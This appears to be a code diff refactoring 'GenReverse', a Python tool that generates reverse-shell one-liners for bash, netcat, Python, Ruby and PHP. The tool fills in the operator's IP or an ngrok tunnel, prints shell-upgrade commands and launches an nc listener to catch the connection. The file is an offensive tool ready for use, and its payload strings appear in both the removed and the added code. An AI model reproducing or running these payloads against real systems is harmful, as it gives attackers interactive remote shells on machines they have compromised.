@@ -1,66 +1,85 @@
-from scapy.all import Ether, IP
-import pyfiglet
-from termcolor import colored
-import time
 import os
+import time
+from argparse import ArgumentParser
+from termcolor import colored
+import pyfiglet
 from pyngrok import ngrok
+from scapy.all import Ether, IP
 
-# banner
-print(pyfiglet.figlet_format("GenReverse"))
 
-ip1 = IP(dst="0.0.0.0").src
-print(colored("####################################################", "blue"))
-print(colored("\nYour IP :", "red"), "[",ip1,"]")
+def print_banner():
+    print(pyfiglet.figlet_format("GenReverse"))
 
-port = input("\nEnter the listening port : ")
+
+def get_public_ip():
+    return IP(dst="0.0.0.0").src
+
 
 def print_shell_commands(ip, port):
-    print(colored("\n[BASH]", "blue"))
-    print(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")
-    print(colored("\n[NETCAT]", "blue"))
-    print(f"nc -e /bin/sh {ip} {port}")
-    print(colored("\n[PYTHON]", "blue"))
-    print(f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
-    print(colored("\n[RUBY]", "blue"))
-    print(f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
-    print(colored("\n[PHP]", "blue"))
-    print(f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
-    print(colored("\n[POWERSHELL]", "blue"))
+    shells = {
+        'bash': f'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
+        'netcat': f'nc -e /bin/sh {ip} {port}',
+        'python': f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
+        'ruby': f'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
+        'php': f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''
+    }
+
+    for shell_name, shell_command in shells.items():
+        print(colored(f'\n[{shell_name.upper()}]', 'blue'))
+        print(shell_command)
+
+    print_upgrade_shell_commands()
+
+
+def print_upgrade_shell_commands():
     print(colored("\n#############################################", "blue"))
     print(colored("\nTo upgrade the shell use:", "blue"))
     print(colored("\npython -c 'import pty;pty.spawn(\"/bin/bash\")'", "red"))
     print(colored("\nOr", "blue"))
     print(colored("\n/usr/bin/script -qc /bin/bash /dev/null", "red"))
+
+
+def launch_listener(port):
     print(colored("\nLaunching the listener...", "red"))
     time.sleep(2)
-    os.system(f'\n\nsudo nc -lvnp{port}')
+    os.system(f'\n\nsudo nc -lvnp {port}')
 
-def usengrok():
+
+def usengrok(port):
     print("\nActivation of Ngrok..")
     time.sleep(2)
     connection = ngrok.connect(port, "tcp").public_url
-    ssh, port1 = connection.strip("tcp://").split(":")
+    ssh, _ = connection.strip("tcp://").split(":")
     print("\nUrl ngrok: ", ssh)
-    print("Port ngrok: ", port1)
-    print_shell_commands(ssh, port1)
-    os.system('\n\nnc -lvp' + str(port))
+    print_shell_commands(ssh, port)
+    launch_listener(port)
 
-def reverseShell():
-    print_shell_commands(ip1, port)
 
-def ip():
-    a = input("\n1- Using Ngrok ?:\n2- Use this IP " + ip1 + " ?:\n\nMake your choice ? : ")
-    if a == "1":
-        usengrok()
-    elif a == "2":
-        reverseShell()
-    elif a == "3":
-        ip2 = input("choisie ton ip:?")
-        ip2 = ip1
-        reverseShell()
-    elif a > "2":
-        print("Aurevoir") 
+def reverse_shell(ip, port):
+    print_shell_commands(ip, port)
+    launch_listener(port)
+
+
+def parse_args():
+    parser = ArgumentParser(description='Generate reverse shell commands.')
+    parser.add_argument('-p', '--port', type=int, required=True, help='The listening port.')
+    parser.add_argument('-n', '--ngrok', action='store_true', help='Use ngrok for public tunneling.')
+    return parser.parse_args()
+
+
+def main():
+    args = parse_args()
+
+    print_banner()
+    public_ip = get_public_ip()
+    print(colored("####################################################", "blue"))
+    print(colored("\nYour IP :", "red"), "[", public_ip, "]")
+
+    if args.ngrok:
+        usengrok(args.port)
     else:
-        print("Faite un choix!")
+        reverse_shell(public_ip, args.port)
 
-ip()
+
+if __name__ == "__main__":
+    main()
